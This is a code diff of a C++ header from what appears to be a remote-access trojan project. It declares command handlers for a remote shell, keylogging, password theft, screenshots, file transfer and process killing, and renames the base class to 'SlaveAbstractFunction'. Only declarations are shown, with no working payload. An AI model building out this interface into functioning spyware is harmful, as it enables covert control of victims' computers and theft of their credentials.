@@ -1,95 +1,79 @@
-#ifndef _OPERATING_MODULES_
-#define _OPERATING_MODULES_
+#ifndef _REMOTE_CONTROL_FUNCTIONS_
+#define _REMOTE_CONTROL_FUNCTIONS_
 
 #include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <common/Log.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Screenshot.hpp>
-#include "ServerAbstractFunction.hpp"
+#include "SlaveAbstractFunction.hpp"
 
 namespace Inhibition
 {
     class ProgramStartupKey;
     class Screenshot;
 
-    class RemoteShell : public ServerAbstractFunction
-    {
-        public:
-        
-            RemoteShell(Blaspheme::ConnectionInfo& info)
-            :cinfo(info)
-            {
-            }
-            
-            virtual void operator()();
-        
-        private:
-
-            Blaspheme::ConnectionInfo& cinfo;
-    };
-
-    class BrowseFileTree : public ServerAbstractFunction
-    {
-        public:
-            BrowseFileTree(){}
-            virtual void operator()();
-    };
-
-    class StartDownload : public ServerAbstractFunction
-    {
-        public:
-        
-            StartDownload(){}
-            virtual void operator()();
-    };
-
-    class StartUpload : public ServerAbstractFunction
-    {
-        public:
-        
-            StartUpload(){}
-            virtual void operator()();
-    };
-
-    class UninstallClient : public ServerAbstractFunction
+    class RemoteShell : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class KillClient : public ServerAbstractFunction
+    class BrowseFileTree : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class UpgradeClient : public ServerAbstractFunction
+    class StartDownload : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class RebootClient : public ServerAbstractFunction
+    class StartUpload : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class SendEmail : public ServerAbstractFunction
-    {
-        public:
-            SendEmail(){}
-            virtual void operator()();
-    };
-
-    class SendKeylog : public ServerAbstractFunction
+    class UninstallClient : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class SendScreenshot : public ServerAbstractFunction
+    class KillClient : public SlaveAbstractFunction
+    {
+        public:
+            virtual void operator()();
+    };
+
+    class UpgradeClient : public SlaveAbstractFunction
+    {
+        public:
+            virtual void operator()();
+    };
+
+    class RebootClient : public SlaveAbstractFunction
+    {
+        public:
+            virtual void operator()();
+    };
+
+    class SendEmail : public SlaveAbstractFunction
+    {
+        public:
+            virtual void operator()();
+    };
+
+    class SendKeylog : public SlaveAbstractFunction
+    {
+        public:
+            virtual void operator()();
+    };
+
+    class SendScreenshot : public SlaveAbstractFunction
     {
         public:
             SendScreenshot(Malicious::Screenshot& screenshooter_ref)
@@ -99,69 +83,60 @@ namespace Inhibition
             Malicious::Screenshot& screenshooter;
     };
 
-    class SendPasswords : public ServerAbstractFunction
+    class SendPasswords : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class SendProcessList : public ServerAbstractFunction
+    class SendProcessList : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class KillProcess : public ServerAbstractFunction
+    class KillProcess : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class SendWindowsVersion : public ServerAbstractFunction
+    class SendWindowsVersion : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class SendClientName : public ServerAbstractFunction
+    class SendClientName : public SlaveAbstractFunction
     {
         public:
-            SendClientName(const Blaspheme::ConnectionInfo& info)
-            :cinfo(info)
-            {
-            }
-            
             virtual void operator()();
-    
-        private:
-            
-            const Blaspheme::ConnectionInfo& cinfo;
     };
-
-    class Shutdown : public ServerAbstractFunction
+	
+    class Shutdown : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class Reboot : public ServerAbstractFunction
+    class Reboot : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class Logout : public ServerAbstractFunction
+    class Logout : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-    class Hibernate : public ServerAbstractFunction
+    class Hibernate : public SlaveAbstractFunction
     {
         public:
             virtual void operator()();
     };
 
-}  /* Inhibition */
+}  // Inhibition
 
-#endif // _OPERATING_MODULES_
+#endif // _REMOTE_CONTROL_FUNCTIONS_
